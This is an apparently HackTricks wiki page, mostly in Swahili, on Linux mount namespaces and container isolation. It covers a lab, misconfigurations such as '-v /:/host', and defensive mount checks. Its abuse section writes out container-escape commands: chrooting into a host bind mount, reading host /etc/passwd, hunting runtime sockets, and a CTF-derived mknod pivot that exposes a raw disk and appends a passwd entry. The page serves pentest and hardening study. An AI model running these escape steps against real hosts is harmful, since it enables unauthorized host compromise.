# Namespace ya Mount

{{#include ../../../../../banners/hacktricks-training.md}}

## Muhtasari

Namespace ya mount inasimamia **mount table** ambayo mchakato unaiona. Hii ni mojawapo ya sifa muhimu za kutenganisha container kwa sababu filesystem ya root, bind mounts, tmpfs mounts, mtazamo wa procfs, kuonekana kwa sysfs, na mounts nyingi za msaada za runtime zote zinaonyeshwa kupitia jedwali hilo la mount. Michakato miwili inaweza kufikia `/`, `/proc`, `/sys`, au `/tmp`, lakini kile njia hizo zinarejea kinategemea namespace ya mount walikotoka.

Kwa mtazamo wa usalama wa container, namespace ya mount mara nyingi ndiyo tofauti kati ya "hii ni filesystem ya programu iliyopangwa vizuri" na "mchakato huu unaweza kuona moja kwa moja au kuathiri filesystem ya host". Hivyo bind mounts, `hostPath` volumes, privileged mount operations, na ufungaji wa `/proc` au `/sys` unaoweza kuandikwa vyote vinakizunguka namespace hii.

## Uendeshaji

Wakati runtime inapoanzisha container, kawaida huunda namespace ya mount safi, huandaa root filesystem kwa container, huweka procfs na filesystem nyingine za msaada inapohitajika, kisha hiari inaweza kuongeza bind mounts, tmpfs mounts, secrets, config maps, au host paths. Mara mchakato huo unapoendesha ndani ya namespace, seti ya mounts anazoziona inageuzwa kuonekana tofauti na muonekano chaguo-msingi wa host. Host bado inaweza kuona filesystem halisi inayoufanya kazi, lakini container inaona toleo lililokusanywa kwake na runtime.

Hii ni yenye nguvu kwa sababu inamruhusu container kuamini kwamba ina root filesystem yake ingawa host bado inasimamia kila kitu. Pia ni hatari kwa sababu ikiwa runtime itaonyesha mount isiyofaa, mchakato ghafla hupata uwezo wa kuona rasilimali za host ambazo sehemu nyingine za modeli ya usalama huenda hazikuwahi kutengenezewa kuwalinda.

## Maabara

Unaweza kuunda namespace ya mount binafsi kwa:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Ikiwa utafungua shell nyingine nje ya namespace hiyo na ukichunguza mount table, utaona kwamba tmpfs mount ipo tu ndani ya isolated mount namespace. Hii ni mazoezi muhimu kwa sababu inaonyesha kwamba mount isolation si nadharia tu; kernel kwa kweli inaonyesha mount table tofauti kwa process.
Ikiwa utafungua shell nyingine nje ya namespace hiyo na ukichunguza mount table, tmpfs mount itakuwa tu ndani ya isolated mount namespace.

Ndani ya containers, kulinganisha kwa haraka ni:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
The second example demonstrates how easy it is for a runtime configuration to punch a huge hole through the filesystem boundary.

## Runtime Usage

Docker, Podman, containerd-based stacks, and CRI-O all rely on a private mount namespace for normal containers. Kubernetes builds on top of the same mechanism for volumes, projected secrets, config maps, and `hostPath` mounts. Incus/LXC environments also rely heavily on mount namespaces, especially because system containers often expose richer and more machine-like filesystems than application containers do.

This means that when you review a container filesystem problem, you are usually not looking at an isolated Docker quirk. You are looking at a mount-namespace and runtime-configuration problem expressed through whatever platform launched the workload.

## Misconfigurations

The most obvious and dangerous mistake is exposing the host root filesystem or another sensitive host path through a bind mount, for example `-v /:/host` or a writable `hostPath` in Kubernetes. At that point, the question is no longer "can the container somehow escape?" but rather "how much useful host content is already directly visible and writable?" A writable host bind mount often turns the rest of the exploit into a simple matter of file placement, chrooting, config modification, or runtime socket discovery.

Another common problem is exposing host `/proc` or `/sys` in ways that bypass the safer container view. These filesystems are not ordinary data mounts; they are interfaces into kernel and process state. If the workload reaches the host versions directly, many of the assumptions behind container hardening stop applying cleanly.

Read-only protections matter too. A read-only root filesystem does not magically secure a container, but it removes a large amount of attacker staging space and makes persistence, helper-binary placement, and config tampering more difficult. Conversely, a writable root or writable host bind mount gives an attacker room to prepare the next step.

## Abuse

When the mount namespace is misused, attackers commonly do one of four things. They **read host data** that should have remained outside the container. They **modify host configuration** through writable bind mounts. They **mount or remount additional resources** if capabilities and seccomp allow it. Or they **reach powerful sockets and runtime state directories** that let them ask the container platform itself for more access.

If the container can already see the host filesystem, the rest of the security model changes immediately.

When you suspect a host bind mount, first confirm what is available and whether it is writable:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Ikiwa filesystem ya root ya host imewekwa kama read-write, upatikanaji wa moja kwa moja kwa host mara nyingi ni rahisi kama:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Ikiwa lengo ni kupata privileged runtime access badala ya chrooting moja kwa moja, orodhesha sockets na runtime state:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Ikiwa `CAP_SYS_ADMIN` inapatikana, jaribu pia kama mounts mpya yanaweza kuundwa kutoka ndani ya container:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Mfano Kamili: Two-Shell `mknod` Pivot

Njia maalum zaidi ya matumizi mabaya hujitokeza wakati mtumiaji root wa container anaweza kuunda block devices, host na container wanaposhirikiana utambulisho wa mtumiaji kwa njia inayofaa, na mshambuliaji tayari ana low-privilege foothold kwenye host. Katika hali hiyo, container inaweza kuunda device node kama `/dev/sda`, na mtumiaji wa host mwenye low-privilege anaweza baadaye kuisoma kupitia `/proc/<pid>/root/` kwa ajili ya mchakato wa container unaolingana.

Ndani ya container:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
Kutoka kwenye host, kama mtumiaji wa low-privilege anayefanana baada ya kupata container shell PID:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
Somo muhimu si utafutaji halisi wa string wa CTF. Somo ni kwamba mount-namespace exposure kupitia `/proc/<pid>/root/` inaweza kumruhusu mtumiaji wa host kutumia tena device nodes zilizoundwa na container, hata wakati sera za cgroup device zilizuia matumizi ya moja kwa moja ndani ya container yenyewe.

## Checks

Amri hizi zipo ili kukuonyesha mtazamo wa filesystem ambao mchakato wa sasa kwa kweli unaishi ndani yake. Lengo ni kutambulisha mounts zilizotokana na host, njia nyeti zinazoweza kuandikwa, na chochote kinachoonekana pana zaidi kuliko filesystem ya root ya container ya kawaida ya application.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
Kinachovutia hapa:

- Bind mounts kutoka host, hasa `/`, `/proc`, `/sys`, direktori za runtime state, au maeneo ya socket, zitoke bayana mara moja.
- Unexpected read-write mounts kwa kawaida zina umuhimu zaidi kuliko idadi kubwa ya read-only helper mounts.
- `mountinfo` mara nyingi ni mahali bora kuona ikiwa njia ni kweli host-derived au overlay-backed.

Mikaguzi hii inaweka wazi **zipi rasilimali zinaonekana kwenye namespace hii**, **zipi zimepatikana kutoka host (host-derived)**, na **zipi kati yao zinazoweza kuandikwa au nyeti kwa usalama**.
{{#include ../../../../../banners/hacktricks-training.md}}
